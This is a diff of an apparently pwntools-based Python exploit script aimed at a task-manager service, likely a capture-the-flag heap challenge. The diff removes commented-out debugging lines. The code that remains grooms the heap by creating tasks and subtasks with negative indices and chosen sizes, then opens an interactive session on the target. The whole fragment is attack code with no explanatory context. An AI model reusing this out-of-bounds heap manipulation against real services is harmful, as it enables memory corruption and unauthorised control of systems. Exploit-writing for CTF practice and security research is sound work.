@@ -78,25 +78,19 @@ def listSubTask(mainTaskId:int):
     for i in range(len(r1)-1):
         pair=r1[i].split(b"] ")
         tasks[int(pair[0][-2:])]=pair[1]
-        # tasks.append(r1[i].split(b"] ")[1])
-    #print(tasks)
+
     return tasks
 
 def main():
-    #pid=int(input("Enter pid: ").strip())
+
     
-    #g=gdb.attach(p)
     CN.recvuntil(PROMPT)
-    #createTask("A"*15)
+
     charset=string.ascii_lowercase
-    #deleteSubTask(0,8)
-    #deleteSubTask(0,10)
-    #deleteSubTask(0,12)
     createTask("A"*15)
     createTask("B"*15)
     for i in range(6):
         createSubTask(charset[i]*3,-11,0x99)
-        #createSubTask(charset[i]*15,0,0x99)
     createSubTask("",-11,255)
     createSubTask("",-11,0)
     createSubTask("",2,0)
@@ -110,20 +104,7 @@ def main():
     CN.send(b"6\n")
     CN.send(b"2\n")
     print(CN.recvuntil(b"choice?"))
-    #deleteSubTask(2,0)
-    #deleteSubTask(2,1)
-    #deleteSubTask(2,3)
     CN.interactive()
-    #    deleteTask(1)
-    #createTask("B"*15)
-    #createSubTask("1"*15,1)
-    #heapaddr=bytes.fromhex(input("Enter heap addr: "))
-    #reversedHeap=heapaddr[::-1]
-    #createSubTask(reversedHeap,0)
-    #print(reversedHeap.hex())
-    #deleteSubTask(0,2)
-    #deleteSubTask(0,4)
-    #deleteSubTask(0,6)
     for i in range(44):
         createTask("A"*15)
     for i in range(24):
